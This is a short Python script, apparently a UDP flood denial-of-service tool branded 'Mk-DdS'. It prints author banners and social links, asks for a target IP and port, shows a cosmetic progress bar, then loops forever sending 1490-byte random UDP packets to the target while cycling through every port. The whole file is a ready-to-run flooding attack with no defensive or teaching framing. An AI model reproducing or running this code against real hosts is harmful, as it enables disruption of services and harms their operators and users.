print("\033[91m")
import sys
import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_ = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Mk-DdS")
print()
print("Coded By : Mr.Mk-777")
print("Author   : Mkmuslim777")
print("Github   : github.com/Mkmuslim777")
print("FB       : https://www.facebook.com/MuslimUddinMk")
print("Telegram : https://t.me/MK777team")
print()

ip = input("IP Target : ")
port = int(input("Port      : "))

os.system("clear")
print("\033[93m")
os.system("figlet Mk777")
print("Team : Mk-777")
print("\033[92m")
print("[                    ] 0% ")
print("[=====               ] 25%")
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)

sent = 0
while True:
    sock.sendto(bytes_, (ip, port))
    sent += 1
    port += 1
    print(f"Sent {sent} packet to {ip} through port: {port}")
    if port == 65534:
        port = 1